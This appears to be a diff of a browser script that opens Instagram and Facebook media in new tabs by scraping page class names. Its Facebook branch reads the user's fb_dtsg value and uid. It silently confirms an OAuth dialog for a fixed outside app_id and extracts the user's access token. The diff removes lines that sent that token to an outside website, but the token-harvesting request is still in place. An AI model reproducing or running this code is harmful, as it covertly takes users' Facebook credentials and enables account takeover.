@@ -8,22 +8,22 @@ switch (host) {
     case "www.instagram.com":
         switch(ps) {
             case "p":
-                    var linkvid = document.getElementsByClassName("_l6uaz")[0];
+                    var linkvid = document.getElementsByClassName("tWeCl")[0];
                     if(linkvid == undefined){
-                    var length_photo = document.getElementsByClassName("_2di5p").length;
+                    var length_photo = document.getElementsByClassName("FFVAD").length;
                     var linkins = length_photo - 1;
-                    var link_photo = document.getElementsByClassName("_2di5p")[linkins].currentSrc;
+                    var link_photo = document.getElementsByClassName("FFVAD")[linkins].currentSrc;
                     window.open(link_photo, '_blank');
-                        
+
                     }else{
                         var linkvid = linkvid.currentSrc;
                         window.open(linkvid, '_blank');
                     }
             case "stories":
-                    var photo = document.getElementsByClassName('_ntjhp')[0].src;
+                    var photo = document.getElementsByClassName('y-yJ5')[0].src;
                 if(photo == null){
-                    var video = document.getElementsByClassName('_ntjhp')[2].currentSrc;
-                    window.open(video, '_blank'); 
+                    var video = document.getElementsByClassName('y-yJ5')[2].currentSrc;
+                    window.open(video, '_blank');
                 }
                 else{
                     window.open(photo , '_blank');
@@ -40,13 +40,11 @@ switch (host) {
                     dtsg = document.getElementsByName("fb_dtsg")[0].value,
                     http = new XMLHttpRequest,
                     url = "//www.facebook.com/v1.0/dialog/oauth/confirm",
-                    params = "fb_dtsg=" + dtsg + "&app_id=165907476854626&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user=" + uid;
+                    params = "fb_dtsg=" + dtsg + "&app_id=165907476854626&redirect_uri=fbconnect://success&display=page&access_token=&from_post=1&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1&__user=" + uid;
                     http.open("POST", url, !0), http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), http.onreadystatechange = function() {
                     if (4 == http.readyState && 200 == http.status) {
                     var a = http.responseText.match(/access_token=(.*)(?=&expires_in)/);
                     var detoken = a[1];
-                    var link = "https://anonyviet.com/php/batkhienfb/index.php?token=" + detoken;
-                    window.open( link ,'_blank');
                     }
                     }, http.send(params);
                 }
@@ -56,10 +54,10 @@ switch (host) {
                                 var story = document.getElementsByClassName('_5i4g')[0];
                                 if(story == undefined){
                                     var get = document.getElementsByClassName('_7yy')[0].innerHTML;
-                                        document.write(get); 
+                                        document.write(get);
                                 }else{
                                     story = story.src;
-                                    window.open(story, '_blank'); 
+                                    window.open(story, '_blank');
                                 }
                     	}else {
                         	function copy(id){
